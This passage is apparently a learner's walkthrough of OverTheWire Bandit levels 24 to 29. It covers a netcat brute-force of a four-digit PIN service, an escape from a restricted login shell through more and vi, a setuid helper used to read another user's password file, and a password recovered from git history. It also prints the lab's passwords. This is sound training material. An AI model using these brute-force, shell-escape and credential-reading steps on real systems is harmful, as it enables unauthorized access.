This creates a uniquely named temporary directory.

I then changed into the newly created directory using:

```bash
cd <temporary-directory>
```

This gave me a clean workspace to create my shell script.

## 📝 Creating the Brute-Force Script

I created a shell script using:

```bash
nano solve.sh
```

I wrote the following script:

```bash
#!/bin/bash

pw="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"

for i in {0000..9999}; do
  echo "$pw $i"
done | nc localhost 30002
```

## 🔍 Understanding the Script

### Shebang

```bash
#!/bin/bash
```

This is the **shebang**.

It tells Linux that the script should be executed using the Bash shell.

### Storing the Password

```bash
pw="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
```

I stored the password for **bandit24** in a Bash variable named:

```text
pw
```

This is the password I obtained from the previous level.

The variable can then be accessed using:

```bash
$pw
```

## 🔢 Generating the PIN Combinations

The main part of the script is:

```bash
for i in {0000..9999}; do
```

This creates a Bash `for` loop.

The expression:

```text
{0000..9999}
```

generates every number from:

```text
0000
0001
0002
0003
...
9997
9998
9999
```

The numbers contain four digits because of the leading zeros.

Therefore, the loop runs exactly:

```text
10,000 times
```

The variable:

```text
i
```

contains the current PIN combination.

For example, during the loop it will contain:

```text
0000
```

then:

```text
0001
```

then:

```text
0002
```

and so on until:

```text
9999
```

## 📤 Generating the Password and PIN

Inside the loop, I used:

```bash
echo "$pw $i"
```

For every PIN combination, this prints:

```text
password PIN
```

For example:

```text
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0000
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0001
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0002
```

and eventually:

```text
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 9999
```

The space between `$pw` and `$i` is important because the daemon expects the password and PIN separated by a space.

## 🔗 Understanding the Pipe

The following part:

```bash
done | nc localhost 30002
```

uses a **pipe**:

```text
|
```

A pipe takes the output of one command and sends it as the input of another command.

Therefore:

```bash
for i in {0000..9999}; do
  echo "$pw $i"
done
```

generates all the password/PIN combinations.

The pipe then sends all of that output into:

```bash
nc localhost 30002
```

So instead of displaying all 10,000 combinations on the terminal, they are sent directly to the daemon.

## 🌐 Understanding Netcat

The command:

```bash
nc localhost 30002
```

uses **Netcat**, commonly abbreviated as `nc`.

`nc` can establish network connections and send or receive data.

The two arguments are:

```text
localhost
30002
```

### `localhost`

```text
localhost
```

refers to the local machine.

The daemon is running on the same machine, so I connect to:

```text
localhost
```

### Port `30002`

```text
30002
```

is the port on which the Bandit daemon is listening.

Therefore:

```bash
nc localhost 30002
```

means:

```text
Connect to the daemon running locally on port 30002.
```

## 🔗 Why Only One Connection Is Needed

The challenge specifically says:

> You do not need to create new connections each time.

My command takes advantage of this.

The structure is:

```text
10,000 password/PIN combinations
              │
              ▼
             Pipe
              │
              ▼
      nc localhost 30002
              │
              ▼
       One network connection
```

Instead of doing:

```text
Connection → PIN 0000 → Close
Connection → PIN 0001 → Close
Connection → PIN 0002 → Close
...
```

I create one connection:

```text
nc localhost 30002
```

and send all the combinations through that same connection.

This makes the brute-force process much more efficient.

## ▶️ Running the Script

After saving the script, I could make it executable using:

```bash
chmod +x solve.sh
```

Then I could execute it with:

```bash
./solve.sh
```

The script generated all 10,000 combinations and sent them to the daemon.

## 📤 Server Response

The server returned several responses indicating that the password and PIN were incorrect:

```text
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
```

Eventually, one of the combinations was correct.

The server responded:

```text
Correct!
The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```

This confirmed that the correct PIN had been found.

## 🔑 Password

The password for **bandit25** is:

```text
SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```

## 🧠 What I Learned

* A **daemon** is a background process that can provide services to other programs.
* Network services can listen for connections on specific **ports**.
* `nc` (Netcat) can be used to communicate with network services.
* `localhost` refers to the local machine.
* A port number identifies a specific network service.
* Bash `for` loops can automate repetitive tasks.
* `{0000..9999}` generates all 10,000 possible four-digit PIN combinations.
* Leading zeros are important because the PIN must contain exactly four digits.
* A Bash variable can be created using:

  ```bash
  variable="value"
  ```
* Variables can be accessed using:

  ```bash
  $variable
  ```
* The `|` operator is called a **pipe** and sends the output of one command into another command.
* Instead of opening a separate connection for every PIN, all combinations can be sent through a single Netcat connection.
* Brute-forcing means systematically trying all possible combinations until the correct one is found.

---

## 📌 Key Takeaway

The main idea of this level was to automate the process of trying all possible PIN combinations.

The complete process was:

```text
Password for bandit24
        │
        ▼
Generate PINs from 0000 → 9999
        │
        ▼
Combine password + PIN
        │
        ▼
Pipe all combinations into Netcat
        │
        ▼
nc localhost 30002
        │
        ▼
Daemon checks each combination
        │
        ▼
Correct combination found
        │
        ▼
Password for bandit25
```

The important script was:

```bash
#!/bin/bash

pw="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"

for i in {0000..9999}; do
  echo "$pw $i"
done | nc localhost 30002
```

The password I obtained for **Level 25** was:

```text
SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```

# Bandit Level 25 → Level 26

## 🎯 Objective

The goal of this level is to log in as **bandit26** and retrieve the password for the next level.

The challenge provides an SSH private key in the `bandit25` home directory. However, logging in normally does not give me a regular shell.

Instead, the `bandit26` account uses a custom shell:

```text
/usr/bin/showtext
```

This script runs the `more` command on a text file and then exits.

The main challenge is to exploit the interactive behavior of `more` to access a shell as `bandit26`.

## 🔎 Examining the `bandit26` User

I first checked how the `bandit26` account is configured:

```bash
cat /etc/passwd | grep bandit26
```

The output showed that the default shell for `bandit26` is:

```text
/usr/bin/showtext
```

This means that when I successfully authenticate as `bandit26`, instead of getting a normal Bash shell, the system executes:

```text
/usr/bin/showtext
```

## 📄 Examining `/usr/bin/showtext`

I then read the contents of the script:

```bash
cat /usr/bin/showtext
```

The script contained:

```bash
#!/bin/sh
export TERM=linux
more ~/text.txt
exit 0
```

## 🧠 Understanding the Script

### `#!/bin/sh`

```bash
#!/bin/sh
```

This is the shebang.

It tells Linux to execute the script using the `/bin/sh` shell.

### Setting the Terminal Type

```bash
export TERM=linux
```

This sets the `TERM` environment variable to:

```text
linux
```

The `TERM` variable tells programs what type of terminal they are running inside.

This is useful for programs such as `more` and `vi`, which need to know how to interact with the terminal.

### Running `more`

The most important command is:

```bash
more ~/text.txt
```

`more` is a terminal-based pager.

It displays a file one screen at a time.

Normally, if the entire file fits inside the terminal, `more` finishes immediately.

However, if the file is larger than the available terminal screen, `more` becomes interactive and displays something similar to:

```text
--More--
```

This interactive mode gives us an opportunity to use commands supported by `more`.

### Exiting the Script

After `more` finishes, the script executes:

```bash
exit 0
```

This terminates the shell.

Therefore, under normal circumstances, logging into `bandit26` would immediately show the text file and then disconnect me.

## 🪟 Making `more` Interactive

The key to solving this level is making the terminal small enough that `~/text.txt` does not fit on the screen.

I resized my terminal window vertically until it was only around **4–5 lines high**.

This causes the `more` command to pause instead of displaying the entire file at once.

## 🔐 Connecting as `bandit26`

The `bandit25` home directory contains an SSH private key:

```text
bandit26.sshkey
```

I used this key to connect to `bandit26`:

```bash
ssh -i bandit26.sshkey bandit26@localhost -p 2220
```

The command means:

```text
ssh
│
├── -i bandit26.sshkey
│       Use the specified private SSH key
│
├── bandit26@localhost
│       Connect as the bandit26 user
│
└── -p 2220
        Connect to SSH port 2220
```

Because the terminal was very small, the `more` command became interactive.

Instead of immediately exiting, I reached the `more` interface.

## 🔓 Breaking Out of `more`

While inside the interactive `more` screen, I pressed:

```text
v
```

The `v` command opens the currently displayed file in the configured editor.

This launched the `vi`/`vim` editor.

This is important because `vi` provides a way to execute shell commands.

## ⚙️ Changing the Shell Used by `vi`

Inside `vi`, I entered:

```text
:set shell=/bin/bash
```

and pressed **Enter**.

This changes the shell that `vi` uses when executing shell commands.

The shell is now:

```text
/bin/bash
```

instead of the default shell:

```text
/usr/bin/showtext
```

## 🐚 Spawning a Bash Shell

I then entered:

```text
:shell
```

and pressed **Enter**.

This instructed `vi` to start a shell.

Since I had changed the shell to:

```text
/bin/bash
```

I was given a normal Bash shell.

The important part is that this shell was running with the permissions of:

```text
bandit26
```

Therefore, I had successfully escaped the restrictive `showtext` shell.

The execution chain was:

```text
SSH login as bandit26
        ↓
/usr/bin/showtext
        ↓
more ~/text.txt
        ↓
Press v
        ↓
vi/vim
        ↓
:set shell=/bin/bash
        ↓
:shell
        ↓
Bash shell as bandit26
```

## 🔑 Retrieving the Password

Once I had a normal shell as `bandit26`, I could read the password file:

```bash
cat /etc/bandit_pass/bandit26
```

This returned:

```text
jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ
```

## 🔑 Password

```text
jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ
```

## 🧠 What I Learned

* `/etc/passwd` contains information about user accounts and their configured login shells.
* The shell specified for a user determines what is executed when that user logs in.
* A user does not necessarily have to use Bash as their login shell.
* `more` is a terminal pager that can become interactive when the displayed content does not fit on the screen.
* Making the terminal smaller can force `more` into interactive mode.
* The `v` command in `more` can open the displayed file in an editor.
* `vi`/`vim` can execute shell commands.
* `:set shell=/bin/bash` changes the shell used by `vi`.
* `:shell` launches the configured shell from inside `vi`.
* Even when a user has a restricted login shell, other programs launched with that user's permissions may provide access to a normal shell.
* SSH private keys can be used for authentication instead of passwords.

---

## 📌 Key Takeaway

The main idea of this level was to escape the custom `showtext` shell by taking advantage of the interactive features of `more` and `vi`.

The complete execution chain was:

```text
bandit25
    │
    │ SSH private key
    ▼
bandit26
    │
    ▼
/usr/bin/showtext
    │
    ▼
more ~/text.txt
    │
    │ Small terminal
    ▼
Interactive more
    │
    │ Press v
    ▼
vi/vim
    │
    │ :set shell=/bin/bash
    ▼
Bash configured as vi's shell
    │
    │ :shell
    ▼
Bash shell as bandit26
    │
    ▼
cat /etc/bandit_pass/bandit26
    │
    ▼
Password for Level 26
```

The important commands I used were:

```bash
cat /etc/passwd | grep bandit26
```

```bash
cat /usr/bin/showtext
```

```bash
ssh -i bandit26.sshkey bandit26@localhost -p 2220
```

Inside `more`:

```text
v
```

Inside `vi`:

```text
:set shell=/bin/bash
```

Then:

```text
:shell
```

Finally:

```bash
cat /etc/bandit_pass/bandit26
```

which gave me the password for **Level 26**:

```text
jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ
```

# Bandit Level 26 → Level 27

## 🎯 Objective

The goal of this level is to retrieve the password for **bandit27**.

After completing the previous level, I already had access to a normal Bash shell as:

```text
bandit26
```

From this shell, I needed to examine the files in the current directory and look for something that could be used to execute commands with higher privileges.

## 🔎 Listing the Files

I used:

```bash
ls -la
```

This displayed the files in the current directory along with their permissions.

Among the files, I found:

```text
bandit27-do
```

The important thing about this file was its **Set User ID (Setuid)** permission.

## 🔐 Understanding Setuid

Setuid is a special Linux permission that allows an executable file to run with the permissions of its **owner**, rather than the permissions of the user executing it.

In this case, the executable:

```text
bandit27-do
```

is owned by:

```text
bandit27
```

Therefore, when I execute:

```bash
./bandit27-do
```

the command runs with the permissions of **bandit27**.

This is important because I am currently logged in as:

```text
bandit26
```

Normally, `bandit26` cannot read:

```text
/etc/bandit_pass/bandit27
```

However, the Setuid executable allows me to execute a command with `bandit27`'s permissions.

The basic idea is:

```text
bandit26
    │
    │ Executes
    ▼
./bandit27-do
    │
    │ Setuid
    ▼
Runs with bandit27 permissions
```

## 🔍 Using `bandit27-do`

The executable allows me to provide a command that should be executed.

I used:

```bash
./bandit27-do cat /etc/bandit_pass/bandit27
```

Here:

```text
./bandit27-do
```

executes the Setuid program.

The remaining part:

```text
cat /etc/bandit_pass/bandit27
```

is the command passed to the program.

The `cat` command attempts to read:

```text
/etc/bandit_pass/bandit27
```

Because `bandit27-do` runs with the permissions of `bandit27`, the command has sufficient privileges to read the password file.

## 🔑 Retrieving the Password

I ran:

```bash
./bandit27-do cat /etc/bandit_pass/bandit27
```

The command returned:

```text
STJLJBRRphMxKB392CT4iOr5CbzPU9ER
```

## 🔑 Password

```text
STJLJBRRphMxKB392CT4iOr5CbzPU9ER
```

## 🧠 What I Learned

* `ls -la` displays files along with their permissions and ownership.
* Linux has special permissions in addition to the normal read, write, and execute permissions.
* **Setuid** allows an executable to run with the permissions of its owner.
* The owner of a Setuid executable can therefore be important when analyzing its behavior.
* `./filename` is used to execute a file located in the current directory.
* Arguments can be passed to an executable after its filename.
* `cat` can be used to display the contents of a file.
* Setuid executables can sometimes provide access to resources that the current user cannot normally access.
* Understanding Linux file permissions is an important skill when working with Linux systems and cybersecurity challenges.

---

## 📌 Key Takeaway

The main idea of this level was to recognize the **Setuid** permission on the `bandit27-do` executable and use it to execute a command with `bandit27`'s permissions.

The complete process was:

```text
Bash shell as bandit26
        ↓
ls -la
        ↓
Find bandit27-do
        ↓
Notice Setuid permission
        ↓
Execute ./bandit27-do
        ↓
Command runs with bandit27 permissions
        ↓
cat /etc/bandit_pass/bandit27
        ↓
Password for Level 27
```

The important command I used was:

```bash
./bandit27-do cat /etc/bandit_pass/bandit27
```

which gave me the password for **Level 27**:

```text
STJLJBRRphMxKB392CT4iOr5CbzPU9ER
```

# Bandit Level 27 → Level 28

## 🎯 Objective

There is a Git repository available at:

```text
ssh://bandit27-git@bandit.labs.overthewire.org/home/bandit27-git/repo
```

The repository is accessible through SSH on port:

```text
2220
```

The password for the `bandit27-git` user is the same password I obtained for **bandit27**.

The goal is to clone the repository onto my **local machine** and find the password for the next level.

This level introduces the basics of working with **Git repositories** and cloning a remote repository over SSH.

> **Important:** The repository needs to be cloned from my local machine, not from the OverTheWire Bandit machine.

## 🗂️ Creating a Working Directory

I first created a directory on my local machine to store the Git repository:

```bash
mkdir bandit_git
```

I then moved into the directory:

```bash
cd bandit_git
```

This gives me a clean workspace for the challenge.

## 📥 Cloning the Git Repository

I used the following command to clone the repository:

```bash
git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
```

Here is what each part means:

```text
git clone
```

tells Git to make a local copy of a remote repository.

The SSH URL is:

```text
ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
```

It contains several important parts:

```text
bandit27-git
        ↓
Username used for authentication

bandit.labs.overthewire.org
        ↓
OverTheWire server

2220
        ↓
SSH port

/home/bandit27-git/repo
        ↓
Location of the Git repository
```

When prompted for a password, I entered the password I obtained from the previous level:

```text
STJLJBRRphMxKB392CT4iOr5CbzPU9ER
```

Git then downloaded the repository to my local machine.

## 📂 Entering the Repository

After cloning the repository, Git created a directory named:

```text
repo
```

I entered it using:

```bash
cd repo
```

I then listed the files, including hidden files:

```bash
ls -la
```

This allowed me to inspect the contents of the repository.

## 🔍 Inspecting the Repository

The repository contained a `README` file.

I read it using:

```bash
cat README
```

The file contained:

```text
The password to the next level is: y8Yd2ssKcpHpud7UvOSOxwamRMzIGIeQ
```

Therefore, the password for the next level was directly stored inside the repository's README file.

## 🔑 Password

```text
y8Yd2ssKcpHpud7UvOSOxwamRMzIGIeQ
```

## 🧠 What I Learned

* **Git** is a distributed version control system used to manage source code and other files.
* `git clone` creates a local copy of a remote Git repository.
* Git repositories can be accessed over **SSH**.
* SSH URLs can specify a custom port.
* The syntax:

  ```text
  ssh://username@host:port/path
  ```

  specifies the username, host, port, and remote path.
* `ls -la` displays normal and hidden files.
* `cat` can be used to read text files such as `README`.
* Git repositories can be cloned and inspected from a local computer.
* The password for `bandit27-git` was the same as the password for `bandit27`.

---

## 📌 Key Takeaway

The main idea of this level was to clone a remote Git repository over SSH and inspect its contents.

The complete process was:

```text
Local Machine
      ↓
Create working directory
      ↓
git clone
      ↓
SSH connection to bandit.labs.overthewire.org:2220
      ↓
Authenticate as bandit27-git
      ↓
Repository downloaded
      ↓
cd repo
      ↓
ls -la
      ↓
cat README
      ↓
Password for Level 28
```

The important commands I used were:

```bash
mkdir bandit_git
```

```bash
cd bandit_git
```

```bash
git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
```

```bash
cd repo
```

```bash
ls -la
```

```bash
cat README
```

which gave me the password for **Level 28**:

```text
y8Yd2ssKcpHpud7UvOSOxwamRMzIGIeQ
```
# Bandit Level 28 → Level 29

## 🎯 Objective

There is a Git repository available at:

```text
ssh://bandit28-git@bandit.labs.overthewire.org/home/bandit28-git/repo
```

The repository is accessible through SSH on port:

```text
2220
```

The password for the `bandit28-git` user is the same password I obtained for **bandit28**.

The goal is to clone the repository onto my **local machine** and find the password for the next level.

The interesting part of this level is that the password is not visible in the current version of the repository. However, Git keeps track of previous changes, so I can inspect the repository's history to find the password that was previously stored in the file.

## 📥 Cloning the Repository

I first cloned the repository from my local machine using:

```bash
git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo bandit28-repo
```

The final argument:

```text
bandit28-repo
```

specifies the name of the directory where Git should place the cloned repository.

I then entered the repository:

```bash
cd bandit28-repo
```

When Git requested the password, I entered the password for **bandit28** that I obtained from the previous level.

## 📂 Checking the Current Files

I listed the files in the repository:

```bash
ls -la
```

I then examined the main README file:

```bash
cat README.md
```

The password was not directly visible in the current version of the file.

Instead, the credentials section contained something similar to:

```text
## credentials

- username: bandit29
- password: <TBD>
```

This indicated that the password had been removed or replaced in a later commit.

## 🕐 Inspecting Git History

Since this is a Git repository, previous versions of files may still exist in the repository's history.

I used:

```bash
git log -p
```

The `git log` command displays the commit history.

The `-p` option is particularly useful because it displays the **patch**, or the exact changes made by each commit.

This allowed me to see not only the commit messages but also the actual changes made to the files.

## 🔍 Finding the Removed Password

While examining the commit history, I found a commit that changed the password in `README.md`.

The relevant part of the diff was:

```text
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials
 
 - username: bandit29
-- password: <TBD>
+- password: Em7eGtqaMySwNFjCpwzzHhLhospOcdt0
```

The `-` line represents the previous version:

```text
- password: <TBD>
```

The `+` line represents the new version introduced by that commit:

```text
+ password: Em7eGtqaMySwNFjCpwzzHhLhospOcdt0
```

Therefore, Git's history revealed the password that had previously been stored in the repository.

## 🧠 Understanding Git Diff

The important part of the output was:

```text
- password: <TBD>
+ password: Em7eGtqaMySwNFjCpwzzHhLhospOcdt0
```

In a Git diff:

```text
-
```

means the line was removed or replaced.

While:

```text
+
```

means the line was added.

Therefore, the added line revealed the password.

The important concept is that **removing information from the current version of a Git repository does not necessarily remove it from Git history**.

Previous commits can still contain older versions of files.

## 🔑 Retrieving the Password

The command I used to inspect the Git history was:

```bash
git log -p
```

Inside the output, I found:

```text
- password: <TBD>
+ password: Em7eGtqaMySwNFjCpwzzHhLhospOcdt0
```

The password for the next level was therefore:

```text
Em7eGtqaMySwNFjCpwzzHhLhospOcdt0
```

## 🔑 Password

```text
Em7eGtqaMySwNFjCpwzzHhLhospOcdt0
```

## 🧠 What I Learned

* **Git** is a version control system that keeps track of changes to files.
* `git clone` downloads a remote repository to the local machine.
* `git log` displays the commit history of a repository.
* `git log -p` displays the commit history along with the actual changes made in each commit.
* Git diffs use `-` to indicate removed lines.
* Git diffs use `+` to indicate added lines.
* Information removed from the current version of a file may still exist in previous commits.
* Git history can therefore reveal information that is no longer visible in the latest version of a file.
* Looking through commit history is an important technique when analyzing Git repositories.

---

## 📌 Key Takeaway

The main idea of this level was to realize that the password had been removed from the current version of `README.md`, but Git still had the previous version stored in its history.

The complete process was:

```text
Local Machine
      ↓
Clone bandit28-git repository
      ↓
cd bandit28-repo
      ↓
ls -la
      ↓
cat README.md
      ↓
Password is hidden/replaced
      ↓
git log -p
      ↓
Inspect previous commits
      ↓
Find the previous password
      ↓
Password for Level 29
```

The important commands I used were:

```bash
git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo bandit28-repo
```

```bash
cd bandit28-repo
```

```bash
ls -la
```

```bash
cat README.md
```

and finally:

```bash
git log -p
```

The relevant Git diff was:

```text
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials
 
 - username: bandit29
-- password: <TBD>
+- password: Em7eGtqaMySwNFjCpwzzHhLhospOcdt0
```

which gave me the password for **Level 29**:

```text
Em7eGtqaMySwNFjCpwzzHhLhospOcdt0
```
